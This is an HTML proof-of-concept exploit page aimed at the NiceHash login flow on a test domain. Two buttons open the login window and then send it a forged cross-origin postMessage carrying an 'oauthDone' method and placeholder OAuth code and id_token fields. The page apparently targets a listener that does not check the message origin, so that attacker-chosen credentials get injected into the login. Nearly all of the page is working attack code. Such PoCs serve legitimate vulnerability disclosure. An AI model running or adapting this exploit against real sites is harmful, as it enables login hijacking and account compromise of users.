 <!DOCTYPE html>
  <html>
  <body>
  <button onclick="openTarget()">Step 1: Open NiceHash Login</button>
  <button onclick="attack()" id="btn2" disabled>Step 2: Send Payload</button>
  <pre id="log"></pre>

  <script>
  let nhWin = null;

  function openTarget() {
    nhWin = window.open('https://test.nicehash.com/my/login', 'nhLogin',
      'width=600,height=700,left=100,top=100');
    if (!nhWin) { log('POPUP BLOCKED — allow popups for this page'); return; }
    log('[+] Opened NiceHash login from: ' + window.location.origin);
    log('[+] Waiting 4s for listener to register...');
    setTimeout(() => {
      document.getElementById('btn2').disabled = false;
      log('[+] Ready — click Step 2');
    }, 4000);
  }

  function attack() {
    if (!nhWin) { log('[-] No window ref — click Step 1 first'); return; }
    const payload = {
      method: 'oauthDone',
      data: {
        authorization: {
          code: 'PASTE_FRESH_CODE_HERE',
          id_token: 'PASTE_FRESH_ID_TOKEN_HERE',
          state: 'login'
        }
      }
    };
    nhWin.postMessage(JSON.stringify(payload), '*');
    log('[+] postMessage sent from ' + window.location.origin);
    log('[+] Check NiceHash window → DevTools → Network → apple-callback');
  }

  function log(msg) {
    document.getElementById('log').textContent += msg + '\n';
  }
  </script>
  </body>
  </html>
